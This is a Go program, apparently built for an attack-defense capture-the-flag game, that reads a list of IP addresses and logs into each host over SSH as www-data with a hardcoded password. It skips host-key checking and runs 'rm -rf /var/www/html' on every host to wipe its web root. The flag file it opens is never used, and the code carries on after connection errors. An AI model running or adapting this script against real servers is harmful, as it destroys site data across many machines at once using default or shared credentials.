package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
)

var ipfile = "iplist.txt"
var flagfile = "flaglist.txt"
var usr = "www-data"
var passwd = "xcu2025"
var cmd = "rm -rf /var/www/html"

func execCMD(server, user, password string) {
	//客户端ssh配置
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	//连接ssh
	dial, err := ssh.Dial("tcp", server, config)
	if err != nil {
		fmt.Println("连接到"+server+"失败", err)
	}
	defer dial.Close()

	//创建新会话
	session, err := dial.NewSession()
	if err != nil {
		fmt.Println("创建新会话失败", err)
	}
	defer session.Close()

	//执行命令并获取返回值
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		fmt.Println(cmd+"失败", err)
	}
	fmt.Println(string(output))

}

func Fileexists(name string) bool {
	_, err := os.Stat(name)
	if err != nil {
		return false
	}
	return true
}
func main() {
	open, err := os.Open(ipfile)
	if err != nil {
		fmt.Println("open ipfile error", err)
	}
	defer open.Close()
	scanner := bufio.NewScanner(open)

	var flagFile *os.File
	if Fileexists(flagfile) == false {
		flagFile, err = os.Create(flagfile)
		if err != nil {
			fmt.Println("创建文件失败", err)
		}
	} else {
		flagFile, err = os.OpenFile(flagfile, os.O_WRONLY|os.O_APPEND, 0666)
		if err != nil {
			fmt.Println("打开文件失败")
		}
	}
	defer flagFile.Close()
	for scanner.Scan() {
		line := scanner.Text()
		execCMD(line, usr, passwd)
	}

}
